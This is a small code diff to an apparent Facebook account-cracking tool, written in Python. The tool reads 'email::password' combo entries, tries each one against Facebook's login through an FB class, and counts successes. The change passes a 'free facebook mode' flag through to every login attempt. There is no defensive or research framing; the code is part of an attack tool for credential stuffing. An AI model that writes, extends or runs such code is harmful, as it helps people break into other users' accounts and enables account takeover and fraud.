@@ -1565,6 +1565,7 @@ class CRACK_COUNTER:
        self.F = F
        self.C = C
        self.T = T
+       self.FF = 0
        
    def sucess(self,n=None):     
        if n==None: self.S+=1
@@ -1592,6 +1593,7 @@ def crack(email_pass):
    email,password = email_pass.split("::")
    #print(email,password)
    Q = FB()
+   if C_C.FF == 1: Q.free_facebook_mode()
    Q.set_email(email)
    Q.set_password(password)
    Q_RES = Q.login(NEW=True)
@@ -1626,6 +1628,8 @@ if __name__ == '__main__':
    if FB_MODE.upper() == "Y":
       f.free_facebook_mode()
       FTEXT = "FREE FACEBOOK MODE"
+      C_C.FF = 1
+      
    os.system("clear") 
    print(banner)
    if os.path.exists("cookie") == False: 
